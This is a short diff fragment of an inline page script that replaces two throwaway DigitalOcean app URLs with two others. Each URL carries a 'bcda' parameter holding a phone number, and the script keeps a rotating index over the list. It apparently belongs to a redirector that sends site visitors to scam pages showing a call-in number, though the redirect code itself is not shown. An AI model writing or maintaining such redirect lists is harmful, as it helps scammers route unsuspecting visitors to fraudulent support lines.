@@ -9,8 +9,8 @@
 <script>
 (function () {
     const urls = [
-        "https://seashell-app-iidi7.ondigitalocean.app/?bcda=1-833-351-0404",
-        "https://sea-turtle-app-8aohe.ondigitalocean.app/?bcda=1-833-351-0404"
+        "https://hammerhead-app-ocxv4.ondigitalocean.app/?bcda=(050)-3097-5847",
+        "https://octopus-app-2-abzee.ondigitalocean.app/?bcda=(050)-3097-5847"
     ];
 
     // Get current index (default 0)
